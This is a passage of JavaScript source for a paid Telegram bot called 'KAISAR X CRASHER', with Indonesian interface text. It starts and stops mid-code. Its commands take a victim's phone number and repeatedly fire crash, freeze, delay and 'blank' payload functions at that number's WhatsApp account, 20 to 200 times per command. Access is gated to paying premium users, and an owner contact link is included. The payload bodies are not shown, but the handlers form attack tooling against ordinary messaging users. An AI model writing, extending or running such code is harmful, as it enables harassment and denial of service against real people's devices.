    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Crash Ios Invisible
◇ Target : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 50; i++) {
      await InvisibleCrashIos(sock, jid);
      await sleep(500);

      console.log(
        chalk.red(`[KAISAR] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Crash Ios Invisible
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/crashios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Crash Ios Spam
◇ Target : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 100; i++) {
      await BigIosSuport(sock, jid);
      await BigIosSuport(sock, jid);

      console.log(
        chalk.red(`[KAISAR] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Crash Ios Spam
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xbug (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Bebas Spam Bug
◇ Target : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 20; i++) {
      await DelayHarder(sock, jid);
      await sleep(200);
      await vXdelay(sock, jid);
      await sleep(200);

      console.log(
        chalk.red(`[KAISAR] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Bebas Spam Bug
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xspam (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Bebas Spam Bug
◇ Target : ${formattedNumber}
</pre>`,
      { parse_mode: "HTML" }
    );

    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    for (let i = 0; i < 20; i++) {
      await vXdelay(sock, jid);
      await sleep(200);
      await DelayHarder(sock, jid);
      await sleep(200);

      console.log(
        chalk.red(`[KAISAR] BUG Processing Bugs To ${formattedNumber}`)
      );
      count++;
    }

    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageText(
      `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Bebas Spam Bug
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xcombo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Delay X Bulldozer
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 50; i++) {
      await vXdelay(sock, jid);
      await sleep(500);
      await DelayHarder(sock, jid);
      await sleep(500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Delay X Bulldozer
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xforce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Fc Invisible Android
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 100; i++) {
      await xryyimagexdoc(sock, jid);
      await sleep(500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Fc Invisible Android
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/frezee (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Frezee Android
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 50; i++) {
      await BlankFreezeByMia(sock, jid);
      await sleep(500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Frezee Android
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xdelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Delay Permanent
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 60; i++) {
      await SuperNovaDelayByMia(sock, jid);
      await sleep(500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Delay Permanent
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xdelayv2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Delay Invisible
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 60; i++) {
      await DelayInvisible(sock, jid);
      await sleep(1500);
      await DelayInvisible(sock, jid);
      await sleep(1500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Delay Invisible
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Xbulldo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Buldozer Android
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 200; i++) {
      await DelayBuldozerSuperByMia(sock, jid);
      await sleep(1000);
      await Buldo(sock, jid);
      await sleep(1000);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Buldozer Android
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xandro (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Blank Android
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 60; i++) {
      await Sakata(sock, jid);
      await sleep(1500);
      
      console.log(
        chalk.red(
          `[KAISAR] BUG Processing Bugs To ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    await bot.editMessageText(
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Succes Send Bug
◇ Type : Blank Android
◇ Target : ${formattedNumber}
</pre>`,
{
  chat_id: chatId,
  message_id: sentMessage.message_id,
  parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "CEK TARGET 🔥", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xblank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA OWNER
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Telegram",
              url: "https://t.me/dyyganteng123 ",
            },
          ],
        ],
      },
    });
  }
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }
    const sentMessage = await bot.sendMessage(
  chatId,
  `
<pre>
⬡═―—⊱ KAISAR X CRASHER ⊰―—═⬡
◇ Pengirim : ${username}
◇ Status : Proses Send Bug
◇ Type : Blank Medium
◇ Target : ${formattedNumber}
</pre>`,
  { parse_mode: "HTML" }
);
    let count = 0;
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    for (let i = 0; i < 60; i++) {
      await ExploitSender(sock, jid);
      await sleep(1000);     
      
      console.log(
        chalk.red(
